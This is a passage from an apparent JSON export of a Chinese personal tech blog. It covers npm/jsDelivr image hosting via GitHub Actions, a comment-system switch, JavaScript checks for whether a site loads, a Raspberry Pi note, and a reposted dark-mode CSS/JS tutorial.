class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 